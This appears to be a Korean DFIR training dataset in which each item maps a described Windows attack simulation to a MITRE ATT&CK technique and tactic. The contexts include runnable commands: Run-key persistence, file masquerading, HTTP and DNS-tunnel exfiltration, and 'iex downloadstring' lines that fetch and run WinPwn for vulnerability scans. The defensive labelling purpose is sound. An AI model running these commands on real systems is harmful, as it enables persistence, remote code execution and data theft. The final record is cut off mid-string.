{"id": "T1036.005_T1036.005-2_Q2", "question": "다음과 같은 행위 로그가 포착되었다. 포렌식/DFIR 관점에서 이 행위를 MITRE ATT&CK의 어떤 기법(T-ID)과 전술(tactic)으로 태깅해야 할까?", "context": "[Technique] T1036.005 Masquerading: Match Legitimate Name or Location (Tactic: Defense Evasion)\n[요약] 정상 cmd.exe를 복사해 VEDetector.exe라는 합법 프로그램처럼 보이는 이름으로 변경한 뒤, HKLM Run 레지스트리 키에 등록해 지속성과 위장을 동시에 구현한다. 이후 VEDetector.exe를 실행하고, 프로세스·레지스트리 기반 탐지 시나리오를 모사한다.\n[절차] 입력 인자 source_file (기본: %SystemRoot%\\System32\\cmd.exe)가 실제로 존재하는지 Test-Path로 확인한다. Copy-Item을 사용해 cmd.exe를 #{ved_path}\\VEDetector.exe 경로로 복사·이름 변경한다. New-ItemProperty를 사용해 HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run 아래에 \"VEDetector\" 값을 생성하고, 값 데이터로 #{ved_path}\\VEDetector.exe 경로를 설정해 부팅 시 자동 실행되도록 구성한다. Start-Process -FilePath \"#{ved_path}\\VEDetector.exe\" 로 위장된 실행 파일을 시작하고 약 5초간 대기한다. cleanup 단계에서 Run 키를 제거하고, 실행 중인 VEDetector 프로세스를 중지한 뒤, VEDetector.exe 파일을 삭제한다.\n[대표 명령 예시]\n# Copy and rename cmd.exe to VEDetector.exe\nCopy-Item -Path \"#{source_file}\" -Destination \"#{ved_path}\\VEDetector.exe\" -Force\n\n# Create registry run key for persistence\nNew-ItemProperty -Path \"HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" -Name \"VEDetector\" -Value \"#{ved_path}\\VEDetector.exe\" -PropertyType String -Force\n\n# Start the renamed process\nStart-Process -FilePath \"#{ved_path}\\VEDetector.exe\"\n\nStart-Sleep -Seconds 5", "answer": "이 행위는 MITRE ATT&CK의 T1036.005 \"Masquerading: Match Legitimate Name or Location\" 기법으로 분류하는 것이 적절하다. 전술(tactic)은 Defense Evasion이며, 기존 태그(action/domain/ttp)에 나타난 것처럼 해당 테스트는 위 기술의 대표적인 예시로 볼 수 있다."}
{"id": "T1036.007_T1036.007-1_Q1", "question": "다음과 같은 행위 로그가 포착되었다. 포렌식/DFIR 관점에서 이 행위를 MITRE ATT&CK의 어떤 기법(T-ID)과 전술(tactic)으로 태깅해야 할까?", "context": "[Technique] T1036.007 Masquerading: Double File Extension (Tactic: Defense Evasion)\n[요약] 기본 calc.exe, VBS, PowerShell 스크립트를 복사해 docx.exe, pdf.exe, xls.vbs, png.vbs, doc.ps1 등 이중 확장자 파일로 %TEMP%에 생성한 뒤 순차적으로 실행한다. 사용자가 보기에는 문서·이미지·오피스 파일 같은 이름이지만 실제로는 실행 파일과 스크립트가 동작하는 상황을 재현한다.\n[절차] 입력 인자 exe_path, vbs_path, ps1_path가 지정한 경로에 존재하는지(특히 VBS/PS1는 dependency에서) 확인한다. copy 명령을 사용해 #{exe_path}를 %TEMP%\\T1036.007_masquerading.docx.exe, .pdf.exe, .ps1.exe 등 이중 확장자 형태로 복사한다. 동일하게 #{vbs_path}를 %TEMP%\\T1036.007_masquerading.xls.vbs, .xlsx.vbs, .png.vbs 로 복사하여 오피스/이미지 파일처럼 보이도록 만든다. 또한 #{ps1_path}를 %TEMP%\\T1036.007_masquerading.doc.ps1, .pdf.ps1, .rtf.ps1 로 복사해 문서 파일 이름을 갖는 PowerShell 스크립트를 생성한다. %TEMP% 경로의 이중 확장자 exe, vbs, ps1 파일들을 순차적으로 실행해 calc.exe 인스턴스와 VBS/PowerShell 창이 여러 개 실행되는 상황을 만든다. cleanup 단계에서 생성된 모든 T1036.007_masquerading.* 이중 확장자 파일을 삭제한다.\n[대표 명령 예시]\ncopy \"#{exe_path}\" %temp%\\T1036.007_masquerading.docx.exe /Y\r\ncopy \"#{exe_path}\" %temp%\\T1036.007_masquerading.pdf.exe /Y\r\ncopy \"#{exe_path}\" %temp%\\T1036.007_masquerading.ps1.exe /Y\r\ncopy \"#{vbs_path}\" %temp%\\T1036.007_masquerading.xls.vbs /Y\r\ncopy \"#{vbs_path}\" %temp%\\T1036.007_masquerading.xlsx.vbs /Y\r\ncopy \"#{vbs_path}\" %temp%\\T1036.007_masquerading.png.vbs /Y\r\ncopy \"#{ps1_path}\" %temp%\\T1036.007_masquerading.doc.ps1 /Y\r\ncopy \"#{ps1_path}\" %temp%\\T1036.007_masquerading.pdf.ps1 /Y\r\ncopy \"#{ps1_path}\" %temp%\\T1036.007_masquerading.rtf.ps1 /Y\r\n%temp%\\T1036.007_masquerading.docx.exe\r\n%temp%\\T1036.007_masquerading.pdf.exe\r\n%temp%\\T1036.007_masquerading.ps1.exe\r\n%temp%\\T1036.007_masquerading.xls.vbs\r\n%temp%\\T1036.007_masquerading.xlsx.vbs\r\n%temp%\\T1036.007_masquerading.png.vbs\r\nC:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -File %temp%\\T1036.007_masquerading.doc.ps1\r\nC:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -File %temp%\\T1036.007_masquerading.pdf.ps1\r\nC:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -File %temp%\\T1036.007_masquerading.rtf.ps1", "answer": "이 행위는 MITRE ATT&CK의 T1036.007 \"Masquerading: Double File Extension\" 기법으로 분류하는 것이 적절하다. 전술(tactic)은 Defense Evasion이며, 기존 태그(action/domain/ttp)에 나타난 것처럼 해당 테스트는 위 기술의 대표적인 예시로 볼 수 있다."}
{"id": "T1037.001_T1037.001-1_Q1", "question": "다음과 같은 행위 로그가 포착되었다. 포렌식/DFIR 관점에서 이 행위를 MITRE ATT&CK의 어떤 기법(T-ID)과 전술(tactic)으로 태깅해야 할까?", "context": "[Technique] T1037.001 Boot or Logon Initialization Scripts: Logon Script (Windows) (Tactic: Persistence)\n[요약] 사용자 %TEMP% 디렉터리에 art.bat 배치 스크립트를 생성하고, HKCU\\Environment\\UserInitMprLogonScript 레지스트리 값을 통해 로그온 스크립트로 등록한다. 로그온 시 해당 스크립트는 사용자 데스크톱에 T1037.001-log.txt 파일을 생성하며, 이를 통해 레지스트리 기반 로그온 스크립트 지속성 시나리오를 모사한다.\n[절차] 입력 인자 script_path(기본: %temp%\\art.bat)와 script_command 내용을 바탕으로 배치 파일을 생성한다. REG.exe를 사용해 HKCU\\Environment 키 아래 UserInitMprLogonScript 값에 배치 스크립트 경로를 등록한다. 사용자가 로그오프 후 다시 로그온하면 UserInitMprLogonScript에 지정된 배치 스크립트가 실행된다. 기본 script_command는 사용자 프로필 데스크톱에 T1037.001-log.txt 파일을 생성하며 로그 메시지를 추가한다. cleanup 단계에서는 레지스트리 값과 생성된 .bat 파일, 로그 파일을 삭제해 흔적을 정리한다.\n[대표 명령 예시]\necho \"#{script_command}\" > #{script_path}\r\nREG.exe ADD HKCU\\Environment /v UserInitMprLogonScript /t REG_SZ /d \"#{script_path}\" /f", "answer": "이 행위는 MITRE ATT&CK의 T1037.001 \"Boot or Logon Initialization Scripts: Logon Script (Windows)\" 기법으로 분류하는 것이 적절하다. 전술(tactic)은 Persistence이며, 기존 태그(action/domain/ttp)에 나타난 것처럼 해당 테스트는 위 기술의 대표적인 예시로 볼 수 있다."}
{"id": "T1039_T1039-1_Q1", "question": "다음과 같은 행위 로그가 포착되었다. 포렌식/DFIR 관점에서 이 행위를 MITRE ATT&CK의 어떤 기법(T-ID)과 전술(tactic)으로 태깅해야 할까?", "context": "[Technique] T1039 Data from Network Shared Drive (Tactic: Collection)\n[요약] 원격 시스템의 관리 공유(\\\\<remote>\\C$)에 있는 \"민감 파일\"을 copy 명령으로 로컬 %TEMP% 경로로 복사하는 시나리오이다. C$ 관리 공유 존재 여부와 대상 파일 존재 여부를 선행 조건으로 검사한 뒤, 로컬에 동일 내용을 가진 파일을 생성해 네트워크 공유 기반 데이터 수집을 모사한다.\n[절차] 관리 공유가 활성화된 원격 호스트(기본: 127.0.0.1)에서 \\\\#{remote}\\C$ 경로 접근 여부를 확인한다. 원격 경로 \\\\#{remote}\\C$\\#{share_file} 에 테스트용 파일을 생성해 \"민감 파일\"을 준비한다. cmd.exe copy 명령을 사용해 \\\\#{remote}\\C$\\#{share_file} 를 로컬 %TEMP%\\#{local_file} 경로로 복사한다. 복사 완료 후 로컬 %TEMP% 경로에 새 파일이 생성되었는지 확인한다. 정리 단계에서 원격 파일과 로컬에 복사된 파일을 삭제해 흔적을 제거한다.\n[대표 명령 예시]\ncopy \\\\#{remote}\\C$\\#{share_file} %TEMP%\\#{local_file}", "answer": "이 행위는 MITRE ATT&CK의 T1039 \"Data from Network Shared Drive\" 기법으로 분류하는 것이 적절하다. 전술(tactic)은 Collection이며, 기존 태그(action/domain/ttp)에 나타난 것처럼 해당 테스트는 위 기술의 대표적인 예시로 볼 수 있다."}
{"id": "T1039_T1039-2_Q2", "question": "다음과 같은 행위 로그가 포착되었다. 포렌식/DFIR 관점에서 이 행위를 MITRE ATT&CK의 어떤 기법(T-ID)과 전술(tactic)으로 태깅해야 할까?", "context": "[Technique] T1039 Data from Network Shared Drive (Tactic: Collection)\n[요약] PowerShell의 Copy-Item cmdlet을 사용해 원격 관리 공유(\\\\<remote>\\C$)에 있는 파일을 로컬 %TEMP% 경로로 복사한다. 첫 번째 테스트와 동일한 시나리오를 PowerShell 기반으로 구현한 형태로, SMB를 통한 네트워크 공유 데이터 수집을 모사한다.\n[절차] 원격 시스템의 C$ 관리 공유(\\\\#{remote}\\C$) 존재 여부를 Test-Path로 확인한다. 없을 경우 사용자에게 C$ 공유 활성화를 안내하고, 존재 시 \\\\#{remote}\\C$\\#{share_file} 위치에 테스트용 파일을 생성한다. PowerShell Copy-Item 을 사용해 \\\\#{remote}\\C$\\#{share_file} 를 $Env:TEMP\\#{local_file} 로 복사한다. 로컬 TEMP 디렉터리에 새 파일이 생성되었는지 확인해 복사 성공 여부를 검증한다. cleanup 단계에서 원격 파일과 로컬에 복사된 파일을 Remove-Item 으로 삭제한다.\n[대표 명령 예시]\ncopy-item -Path \"\\\\#{remote}\\C$\\#{share_file}\" -Destination \"$Env:TEMP\\#{local_file}\"", "answer": "이 행위는 MITRE ATT&CK의 T1039 \"Data from Network Shared Drive\" 기법으로 분류하는 것이 적절하다. 전술(tactic)은 Collection이며, 기존 태그(action/domain/ttp)에 나타난 것처럼 해당 테스트는 위 기술의 대표적인 예시로 볼 수 있다."}
{"id": "T1040_T1040-1_Q1", "question": "다음과 같은 행위 로그가 포착되었다. 포렌식/DFIR 관점에서 이 행위를 MITRE ATT&CK의 어떤 기법(T-ID)과 전술(tactic)으로 태깅해야 할까?", "context": "[Technique] T1040 Network Sniffing (Tactic: Credential Access)\n[요약] Wireshark에 포함된 tshark.exe를 사용하여 지정한 인터페이스(Ethernet 등)에서 5개의 패킷을 캡처하는 테스트이다. 사전에 Wireshark와 Npcap이 설치되어 있어야 하며, 관리 권한으로 실행되는 환경을 가정한다.\n[절차] 사전 조건으로 Wireshark가 설치되어 있고 tshark.exe가 기본 경로(기본값: c:\\\\Program Files\\\\Wireshark\\\\tshark.exe)에 존재하는지 확인한다. Npcap 드라이버가 설치되어 있고 C:\\\\Program Files\\\\Npcap\\\\npcap.sys 경로에 존재하는지 확인한다. 필요 시 Invoke-WebRequest 를 이용해 Wireshark 설치 파일과 Npcap 설치 파일을 다운로드하고 조용히(/S) 설치한다. 명령 프롬프트(관리자 권한)에서 tshark.exe -i #{interface} -c 5 를 실행하여 지정된 인터페이스에서 5개의 패킷을 캡처한다. 명령이 완료되면 표준 출력에 캡처된 패킷 요약이 표시되며, 추가 아티팩트(PCAP 파일)는 생성하지 않는다(테스트 정의 기준).\n[대표 명령 예시]\n\"c:\\\\Program Files\\\\Wireshark\\\\tshark.exe\" -i #{interface} -c 5", "answer": "이 행위는 MITRE ATT&CK의 T1040 \"Network Sniffing\" 기법으로 분류하는 것이 적절하다. 전술(tactic)은 Credential Access이며, 기존 태그(action/domain/ttp)에 나타난 것처럼 해당 테스트는 위 기술의 대표적인 예시로 볼 수 있다."}
{"id": "T1040_T1040-2_Q2", "question": "다음과 같은 행위 로그가 포착되었다. 포렌식/DFIR 관점에서 이 행위를 MITRE ATT&CK의 어떤 기법(T-ID)과 전술(tactic)으로 태깅해야 할까?", "context": "[Technique] T1040 Network Sniffing (Tactic: Credential Access)\n[요약] Windows 기본 제공 netsh trace 기능을 사용하여 네트워크 트레이스를 %TEMP%\\\\trace.etl 에 저장하고, 종료 시 trace.cab 로 패키징되는 동작을 모사한다. 내부 패킷 캡처 기능 악용 시나리오 탐지에 활용할 수 있다.\n[절차] 관리자 권한 명령 프롬프트를 실행한다. netsh trace start capture=yes tracefile=%temp%\\\\trace.etl maxsize=10 명령을 실행해 네트워크 트레이스를 시작하고, 최대 10MB까지 기록하도록 설정한다. 일정 시간 동안(테스트 정의상 별도 Sleep 없음) 시스템에서 네트워크 트래픽이 발생하도록 둔다. cleanup 단계에서 netsh trace stop 을 실행하여 캡처를 중지하고, 잠시 대기 후 %temp%\\\\trace.etl 및 %temp%\\\\trace.cab 파일을 삭제한다.\n[대표 명령 예시]\nnetsh trace start capture=yes tracefile=%temp%\\trace.etl maxsize=10", "answer": "이 행위는 MITRE ATT&CK의 T1040 \"Network Sniffing\" 기법으로 분류하는 것이 적절하다. 전술(tactic)은 Credential Access이며, 기존 태그(action/domain/ttp)에 나타난 것처럼 해당 테스트는 위 기술의 대표적인 예시로 볼 수 있다."}
{"id": "T1040_T1040-3_Q3", "question": "다음과 같은 행위 로그가 포착되었다. 포렌식/DFIR 관점에서 이 행위를 MITRE ATT&CK의 어떤 기법(T-ID)과 전술(tactic)으로 태깅해야 할까?", "context": "[Technique] T1040 Network Sniffing (Tactic: Credential Access)\n[요약] Windows 10/Server 2019 이후 포함된 pktmon.exe(로컬 패킷 모니터)를 사용해 etw 기반 패킷 캡처를 시작하고, 일정 시간 후 중지한 뒤 로그를 %TEMP%\\\\t1040.etl 파일로 저장하는 시나리오이다.\n[절차] 관리자 권한 명령 프롬프트를 실행한다. pktmon.exe start --etw -f %TEMP%\\t1040.etl 명령으로 ETW 기반 패킷 캡처를 시작하고 출력 파일을 %TEMP%\\t1040.etl 로 지정한다. TIMEOUT /T 5 명령을 통해 약 5초간 캡처를 진행하도록 대기한다. pktmon.exe stop 명령으로 캡처를 중지한다. cleanup 단계에서 %TEMP%\\t1040.etl 파일을 삭제한다.\n[대표 명령 예시]\npktmon.exe start --etw  -f %TEMP%\\t1040.etl\nTIMEOUT /T 5 >nul 2>&1\npktmon.exe stop", "answer": "이 행위는 MITRE ATT&CK의 T1040 \"Network Sniffing\" 기법으로 분류하는 것이 적절하다. 전술(tactic)은 Credential Access이며, 기존 태그(action/domain/ttp)에 나타난 것처럼 해당 테스트는 위 기술의 대표적인 예시로 볼 수 있다."}
{"id": "T1040_T1040-4_Q4", "question": "다음과 같은 행위 로그가 포착되었다. 포렌식/DFIR 관점에서 이 행위를 MITRE ATT&CK의 어떤 기법(T-ID)과 전술(tactic)으로 태깅해야 할까?", "context": "[Technique] T1040 Network Sniffing (Tactic: Credential Access)\n[요약] pktmon.exe filter add -p 445 명령을 사용해 TCP/UDP 포트 445(SMB 트래픽)에 대한 필터를 설정하는 테스트이다. 실제 캡처는 수행하지 않고, 캡처 전에 수행되는 필터 설정 단계만 모사한다.\n[절차] 관리자 권한 CMD를 실행한다. pktmon.exe filter add -p 445 명령으로 포트 445에 대한 패킷 필터를 추가한다. 필요 시 pktmon filter list 를 사용해 필터 설정을 확인할 수 있다(테스트 정의에는 포함되지 않음). cleanup 단계에서 pktmon filter remove 명령으로 모든 필터를 제거하여 원래 상태로 되돌린다.\n[대표 명령 예시]\npktmon.exe filter add -p 445", "answer": "이 행위는 MITRE ATT&CK의 T1040 \"Network Sniffing\" 기법으로 분류하는 것이 적절하다. 전술(tactic)은 Credential Access이며, 기존 태그(action/domain/ttp)에 나타난 것처럼 해당 테스트는 위 기술의 대표적인 예시로 볼 수 있다."}
{"id": "T1040_T1040-5_Q5", "question": "다음과 같은 행위 로그가 포착되었다. 포렌식/DFIR 관점에서 이 행위를 MITRE ATT&CK의 어떤 기법(T-ID)과 전술(tactic)으로 태깅해야 할까?", "context": "[Technique] T1040 Network Sniffing (Tactic: Credential Access)\n[요약] PowerShell의 New-NetEventSession 및 Add-NetEventPacketCaptureProvider cmdlet을 사용하여 네트워크 패킷을 ETL 파일로 캡처하는 테스트이다. 캡처 세션 생성 → 패킷 캡처 Provider 추가 → 세션 시작/중지 → 세션 제거 순으로 수행하며, 결과는 %TEMP%\\sniff.etl 에 저장된다.\n[절차] 관리자 권한 PowerShell 세션을 연다. New-NetEventSession -Name Capture007 -LocalFilePath \"$ENV:Temp\\sniff.etl\" 명령으로 ETL 출력 파일 경로를 지정한 캡처 세션을 생성한다. Add-NetEventPacketCaptureProvider -SessionName Capture007 -TruncationLength 100 명령으로 패킷 캡처 Provider 를 추가하고 패킷 길이를 100바이트로 잘라서 기록하도록 설정한다. Start-NetEventSession -Name Capture007 명령을 실행해 세션 기반 네트워크 캡처를 시작한다. 짧은 시간 동안 네트워크 트래픽이 발생하도록 둔 뒤, Stop-NetEventSession -Name Capture007 로 캡처를 중지한다. Remove-NetEventSession -Name Capture007 로 세션 구성을 제거한다. cleanup 단계에서 $ENV:Temp\\sniff.etl 파일을 삭제해 ETL 로그를 정리한다.\n[대표 명령 예시]\nNew-NetEventSession -Name Capture007 -LocalFilePath \"$ENV:Temp\\sniff.etl\"\nAdd-NetEventPacketCaptureProvider -SessionName Capture007 -TruncationLength 100\nStart-NetEventSession -Name Capture007\nStop-NetEventSession -Name Capture007\nRemove-NetEventSession -Name Capture007", "answer": "이 행위는 MITRE ATT&CK의 T1040 \"Network Sniffing\" 기법으로 분류하는 것이 적절하다. 전술(tactic)은 Credential Access이며, 기존 태그(action/domain/ttp)에 나타난 것처럼 해당 테스트는 위 기술의 대표적인 예시로 볼 수 있다."}
{"id": "T1041_T1041-1_Q1", "question": "다음과 같은 행위 로그가 포착되었다. 포렌식/DFIR 관점에서 이 행위를 MITRE ATT&CK의 어떤 기법(T-ID)과 전술(tactic)으로 태깅해야 할까?", "context": "[Technique] T1041 Exfiltration Over C2 Channel (Tactic: Exfiltration)\n[요약] 피해 시스템에 존재하는 파일 내용을 HTTP POST 요청으로 C2 서버에 전송하는 단순 데이터 유출 시나리오를 시뮬레이션한다. 테스트 파일이 없으면 예제 내용을 자동으로 생성한 뒤, PowerShell의 Invoke-WebRequest를 사용해 지정된 URL로 파일 내용을 전송한다.\n[절차] 테스트 대상 파일 경로(기본: %TEMP%\\LineNumbers.txt)가 존재하는지 확인한다. 파일이 없으면 1~100번까지의 번호가 포함된 예제 텍스트 라인을 생성해 파일로 저장한다. Expect100Continue 옵션을 비활성화해 HTTP 통신 옵션을 조정한다. Get-Content로 파일 내용을 읽어 변수에 저장한다. Invoke-WebRequest를 사용해 destination_url로 파일 내용을 HTTP POST 방식으로 전송한다.\n[대표 명령 예시]\nif(-not (Test-Path #{filepath})){ 1..100 | ForEach-Object { Add-Content -Path #{filepath} -Value \"This is line $_.\" } }; [System.Net.ServicePointManager]::Expect100Continue = $false; $filecontent = Get-Content -Path #{filepath}; Invoke-WebRequest -Uri #{destination_url} -Method POST -Body $filecontent -DisableKeepAlive", "answer": "이 행위는 MITRE ATT&CK의 T1041 \"Exfiltration Over C2 Channel\" 기법으로 분류하는 것이 적절하다. 전술(tactic)은 Exfiltration이며, 기존 태그(action/domain/ttp)에 나타난 것처럼 해당 테스트는 위 기술의 대표적인 예시로 볼 수 있다."}
{"id": "T1041_T1041-2_Q2", "question": "다음과 같은 행위 로그가 포착되었다. 포렌식/DFIR 관점에서 이 행위를 MITRE ATT&CK의 어떤 기법(T-ID)과 전술(tactic)으로 태깅해야 할까?", "context": "[Technique] T1041 Exfiltration Over C2 Channel (Tactic: Exfiltration)\n[요약] 텍스트 데이터를 Base64로 인코딩한 후, 일정 길이로 잘라 DNS 쿼리의 서브도메인에 실어 보내는 DNS 터널링 기반 데이터 유출 시나리오를 시뮬레이션한다. PowerShell에서 Resolve-DnsName을 반복 호출해 exfiltrated_data가 dns_server로 점진적으로 전송되는 행위를 재현한다.\n[절차] dns_server, exfiltrated_data, chunk_size 입력 값을 설정한다. exfiltrated_data 문자열을 UTF-8 바이트로 변환한 뒤 Base64 문자열로 인코딩한다. Base64 문자열을 chunk_size 길이 단위로 분할해 여러 개의 청크 목록을 만든다. 각 청크에 \".\"와 dns_server를 이어 붙여 FQDN 형태의 도메인 이름을 구성한다. 각 도메인 이름에 대해 Resolve-DnsName으로 DNS 조회를 수행하고, 쿼리 사이에 지연(Start-Sleep)을 둔다.\n[대표 명령 예시]\n$dnsServer = \"#{dns_server}\"; $exfiltratedData = \"#{exfiltrated_data}\"; $chunkSize = #{chunk_size}; $encodedData = [System.Text.Encoding]::UTF8.GetBytes($exfiltratedData); $encodedData = [Convert]::ToBase64String($encodedData); $chunks = $encodedData -split \"(.{$chunkSize})\"; foreach ($chunk in $chunks) { $dnsQuery = $chunk + \".\" + $dnsServer; Resolve-DnsName -Name $dnsQuery; Start-Sleep -Seconds 5 }", "answer": "이 행위는 MITRE ATT&CK의 T1041 \"Exfiltration Over C2 Channel\" 기법으로 분류하는 것이 적절하다. 전술(tactic)은 Exfiltration이며, 기존 태그(action/domain/ttp)에 나타난 것처럼 해당 테스트는 위 기술의 대표적인 예시로 볼 수 있다."}
{"id": "T1046_T1046-1_Q1", "question": "다음과 같은 행위 로그가 포착되었다. 포렌식/DFIR 관점에서 이 행위를 MITRE ATT&CK의 어떤 기법(T-ID)과 전술(tactic)으로 태깅해야 할까?", "context": "[Technique] T1046 Network Service Discovery (Tactic: Discovery)\n[요약] Windows 환경에서 Nmap을 이용해 로컬 호스트(127.0.0.1)의 열려 있는 포트를 스캔하는 시나리오이다. Nmap이 설치되어 있지 않은 경우, PowerShell을 통해 설치 프로그램을 내려받아 자동 설치한 뒤 포트 스캔을 수행한다.\n[절차] PowerShell에서 Nmap 명령어가 동작하는지(prereq_command) 확인한다. 설치되지 않았다면 지정된 nmap_url에서 설치 파일을 다운로드해 ExternalPayloads 폴더에 저장한다. 다운로드한 Nmap 설치 파일을 무인 설치 옵션(/S)으로 실행해 설치를 완료한다. nmap #{host_to_scan} 명령을 실행해 지정된 호스트(기본 127.0.0.1)의 포트를 스캔한다.\n[대표 명령 예시]\nnmap #{host_to_scan}", "answer": "이 행위는 MITRE ATT&CK의 T1046 \"Network Service Discovery\" 기법으로 분류하는 것이 적절하다. 전술(tactic)은 Discovery이며, 기존 태그(action/domain/ttp)에 나타난 것처럼 해당 테스트는 위 기술의 대표적인 예시로 볼 수 있다."}
{"id": "T1046_T1046-2_Q2", "question": "다음과 같은 행위 로그가 포착되었다. 포렌식/DFIR 관점에서 이 행위를 MITRE ATT&CK의 어떤 기법(T-ID)과 전술(tactic)으로 태깅해야 할까?", "context": "[Technique] T1046 Network Service Discovery (Tactic: Discovery)\n[요약] Python 스크립트(T1046.py)를 이용해 지정된 호스트의 포트를 스캔하는 시나리오이다. 시스템에 Python이 설치되어 있지 않은 경우, PowerShell로 설치 파일을 다운로드 및 무인 설치한 후 스캔 스크립트를 실행한다.\n[절차] PowerShell에서 py 명령이 존재하는지(Get-Command py)로 Python 설치 여부를 확인한다. Python이 없으면 공식 사이트에서 설치 프로그램을 다운로드해 ExternalPayloads 폴더에 저장한다. 다운로드한 python_setup.exe를 /quiet 옵션으로 무인 설치해 PATH에 Python을 추가한다. python \"#{filename}\" -i #{host_ip} 명령으로 T1046.py 스크립트를 실행해 대상 호스트의 포트를 스캔한다.\n[대표 명령 예시]\npython \"#{filename}\" -i #{host_ip}", "answer": "이 행위는 MITRE ATT&CK의 T1046 \"Network Service Discovery\" 기법으로 분류하는 것이 적절하다. 전술(tactic)은 Discovery이며, 기존 태그(action/domain/ttp)에 나타난 것처럼 해당 테스트는 위 기술의 대표적인 예시로 볼 수 있다."}
{"id": "T1046_T1046-3_Q3", "question": "다음과 같은 행위 로그가 포착되었다. 포렌식/DFIR 관점에서 이 행위를 MITRE ATT&CK의 어떤 기법(T-ID)과 전술(tactic)으로 태깅해야 할까?", "context": "[Technique] T1046 Network Service Discovery (Tactic: Discovery)\n[요약] WinPwn 프레임워크의 spoolvulnscan 기능을 이용해 MS-RPRN RPC 서비스 취약성이 존재하는 시스템을 스캔하는 시나리오이다. 원격 GitHub에서 WinPwn.ps1을 로드한 뒤, 도메인 내 시스템에 대해 취약한 인쇄 스풀러 관련 서비스를 탐색한다.\n[절차] PowerShell에서 net.webclient 객체를 생성해 원격 스크립트 다운로드를 준비한다. https://raw.githubusercontent.com 경로에서 WinPwn.ps1 스크립트 내용을 다운로드하고 iex로 메모리 상에 로드한다. spoolvulnscan -noninteractive -consoleoutput 명령을 실행해 도메인 내 시스템을 대상으로 MS-RPRN RPC 서비스 취약성을 스캔한다. 콘솔 출력으로 취약 가능성이 있는 호스트 목록을 확인한다.\n[대표 명령 예시]\niex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1'); spoolvulnscan -noninteractive -consoleoutput", "answer": "이 행위는 MITRE ATT&CK의 T1046 \"Network Service Discovery\" 기법으로 분류하는 것이 적절하다. 전술(tactic)은 Discovery이며, 기존 태그(action/domain/ttp)에 나타난 것처럼 해당 테스트는 위 기술의 대표적인 예시로 볼 수 있다."}
{"id": "T1046_T1046-4_Q4", "question": "다음과 같은 행위 로그가 포착되었다. 포렌식/DFIR 관점에서 이 행위를 MITRE ATT&CK의 어떤 기법(T-ID)과 전술(tactic)으로 태깅해야 할까?", "context": "[Technique] T1046 Network Service Discovery (Tactic: Discovery)\n[요약] WinPwn의 MS17-10 함수를 사용해 도메인 내에서 MS17-010(EternalBlue) 취약성에 노출된 Windows 서버를 검색하는 시나리오이다. 원격 GitHub에서 WinPwn.ps1을 로드한 뒤 MS17-10 -noninteractive -consoleoutput을 실행해 취약한 호스트를 식별한다.\n[절차] PowerShell에서 net.webclient를 이용해 WinPwn.ps1을 원격에서 다운로드하고 iex로 로드한다. MS17-10 -noninteractive -consoleoutput 명령을 실행해 도메인 내 호스트 중 MS17-010 취약성을 가진 시스템을 스캔한다. 콘솔 출력에 취약 가능성이 있는 호스트 목록과 관련 정보가 표시된다.\n[대표 명령 예시]\niex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1'); MS17-10 -noninteractive -consoleoutput", "answer": "이 행위는 MITRE ATT&CK의 T1046 \"Network Service Discovery\" 기법으로 분류하는 것이 적절하다. 전술(tactic)은 Discovery이며, 기존 태그(action/domain/ttp)에 나타난 것처럼 해당 테스트는 위 기술의 대표적인 예시로 볼 수 있다."}
{"id": "T1046_T1046-5_Q5", "question": "다음과 같은 행위 로그가 포착되었다. 포렌식/DFIR 관점에서 이 행위를 MITRE ATT&CK의 어떤 기법(T-ID)과 전술(tactic)으로 태깅해야 할까?", "context": "[Technique] T1046 Network Service Discovery (Tactic: Discovery)\n[요약] WinPwn의 bluekeep 함수를 이용해 도메인 내 BlueKeep(RDP 서비스) 취약성이 존재하는 Windows 시스템을 탐색하는 시나리오이다. 스캔에 시간이 오래 걸릴 수 있으며, 원격에서 로드한 WinPwn.ps1을 통해 네트워크 상의 여러 호스트를 점검한다.\n[절차] PowerShell에서 net.webclient로 WinPwn.ps1을 GitHub raw에서 다운로드하고 iex로 로드한다. bluekeep -noninteractive -consoleoutput 명령을 실행해 도메인 내 RDP 서비스가 활성화된 시스템 중 BlueKeep 취약성이 있는 시스템을 스캔한다. 콘솔 출력으로 스캔 진행 상황과 취약 여부 결과를 확인한다.\n[대표 명령 예시]\niex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1'); bluekeep -noninteractive -consoleoutput", "answer": "이 행위는 MITRE ATT&CK의 T1046 \"Network Service Discovery\" 기법으로 분류하는 것이 적절하다. 전술(tactic)은 Discovery이며, 기존 태그(action/domain/ttp)에 나타난 것처럼 해당 테스트는 위 기술의 대표적인 예시로 볼 수 있다."}
{"id": "T1046_T1046-6_Q6", "question": "다음과 같은 행위 로그가 포착되었다. 포렌식/DFIR 관점에서 이 행위를 MITRE ATT&CK의 어떤 기법(T-ID)과 전술(tactic)으로 태깅해야 할까?", "context": "[Technique] T1046 Network Service Discovery (Tactic: Discovery)\n[요약] WinPwn의 fruit 기능을 이용해 네트워크 상의 잠재적으로 취약한 웹 애플리케이션(저위험·저노력 취약점, low-hanging fruits)을 탐색하는 시나리오이다. WinPwn.ps1을 원격 로드한 후 fruit -noninteractive -consoleoutput으로 스캔을 수행한다.\n[절차] PowerShell에서 net.webclient를 사용해 GitHub raw에서 WinPwn.ps1 스크립트를 다운로드하고 iex로 로드한다. fruit -noninteractive -consoleoutput 명령을 실행해 도메인 또는 지정된 범위 내 웹 애플리케이션을 스캔한다. 콘솔로 출력되는 잠재적 취약 웹 애플리케이션 목록을 확인한다.\n[대표 명령 예시]\niex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1'); fruit -noninteractive -consoleoutput", "answer": "이 행위는 MITRE ATT&CK의 T1046 \"Network Service Discovery\" 기법으로 분류하는 것이 적절하다. 전술(tactic)은 Discovery이며, 기존 태그(action/domain/ttp)에 나타난 